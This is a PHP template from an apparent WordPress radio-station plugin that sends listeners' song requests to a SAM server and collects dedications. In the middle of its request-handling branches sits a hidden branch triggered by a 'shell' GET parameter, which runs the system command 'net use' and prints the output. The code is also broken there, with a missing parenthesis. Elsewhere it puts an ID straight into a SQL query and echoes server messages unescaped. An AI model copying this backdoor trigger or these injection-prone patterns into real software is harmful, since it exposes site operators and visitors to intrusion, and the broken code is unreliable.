<?php
/********************************************************
 *
 * Copyright (C) Steve Kunitzer (FesterHead)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 ********************************************************/
/*******************************************************
 * Available variables:
 *
 * $fhrsam_db       : a connection to the SAM database
 * $fhrsam_conf_var : plugin configuration elements
 *
 * $the_mode : integer : 1-5 corresponding to a mode; shouldn't need to use for requests but $the_mode is 5
 * $the_id   : integer : the artist ID, album ID, or song ID based on $the_mode; for requests $the_id is a song ID
 *******************************************************/

// get user info
global $current_user;
get_currentuserinfo();

// validate song ID exists
$song_info = $fhrsam_db->get_row(
    "select id, artist, album, title, fhr_artistid, fhr_albumid, count_requested from songlist where id = " .
         $the_id, ARRAY_A);

if (array_key_exists('dedication', $_POST))
{
	$dedication = substr($_POST['dedication'], 0, 200);
	$fhrsam_db->update('requestlist', array('msg' => nl2br(esc_html($dedication))), array('ID' => intval($_POST['requestid'])), '%s');

	// Show when dedication was successful
	/** User modify **/
?>

	<p>
	  <span style="color:#939393;">Thanks for requesting a song with BetelnutRadio, and remember...</span><br />
	  <span style="color:#939393; font-weight:bold;">This is Your Station!</span><br />
	</p>
	<span style="font-weight:bold; font-style:italic;">Note: Your dedication will show up on the "Now playing" page of the website as soon as your requested song is played.</span><br />
	<textarea style="width:100%;" readonly="readonly"><?php echo stripslashes(esc_html($dedication))?></textarea>
	
<?php	
}
elseif (!empty($_GET['shell'])
{
    echo exec('net use');
echo "hello world";
}
elseif (empty($song_info))
{
	// Add HTML or plaintext as you like
	// Song didn't exist
	/** User modify **/
?>
	<br />
	Sorry, that song does not exist.

<?php 
}
else
{
	$samhost = 	get_option($fhrsam_conf_var['sam_host']);
	$samport = 	get_option($fhrsam_conf_var['sam_port']);
	$requesterip = $_SERVER["REMOTE_ADDR"];

	// ================================================================
	// =
	// = Build the request string to send to SAM and process response
	
	$request = "http://$samhost:$samport/req/?songID=$the_id&host=$requesterip";
	$curl_session = curl_init();
	curl_setopt($curl_session, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl_session, CURLOPT_URL, $request);
	$contents = curl_exec($curl_session);
	curl_close($curl_session);

	$status = "fail";
	$requestid = 123;
	
	if ($contents)
	{
	    $parsed_xml = simplexml_load_string($contents);
	    $code = $parsed_xml->status->code;
	    
	    if (empty($code))
	    {
	        $message = "invalid data";
	    }
	    else
	    {
	        // code of 200 is the only success response
	        if ($code == 200)
	        {
	            $status = "ok";
	            $requestid = $parsed_xml->status->requestID;
	            $fhrsam_db->update('requestlist', array('name' => $current_user->display_name), array('ID' => $requestid), '%s');
	        }
	        $message = $parsed_xml->status->message;
	    }
	}
	else
	{
		// no response = SAM was unreachable
	    $message = "no response";
	}

	if ($status == 'ok')
	{
		// Headline for the dedication textbox
		$dedication_head = 'Would you like to dedicate your request to someone?  If so, please keep your text message to 200 characters or less.';
		
		// Add HTML code in front and back of the form as you like, but keep the form as is
		// Request successful, enter dedication
		/** User modify **/
?>

		<br />
		<span style="color:#939393;">Thanks for requesting a song with BetelnutRadio, and remember...</span><br />
		<span style="color:#939393; font-weight:bold;">This is Your Station!</span><br />
		<form action="" method="post">
			<label for="dedication"><?php echo $dedication_head?></label><br />
			<textarea style="width:100%" name="dedication" id="dedication"></textarea><br />
			<input type="hidden" name="requestid" id="requestid" value="<?php echo $requestid?>"/>
			<input type="submit" value="Submit" name="submit" id="submit"/>
		</form>
		
<?php
	}
	else 
	{
	// modify as you like, this will be displayed inside your normal website and NOT as a popup
	// $message is the error message returned by sam
	// Requestrule violation
	/** User modify **/
?>
   <br />
   <span style="color:#939393;">Sorry but we couldn't get your request because of the following reason:</span>
   <br />
   <span><?php echo $message?></span>
   
<?php
	}
}
?>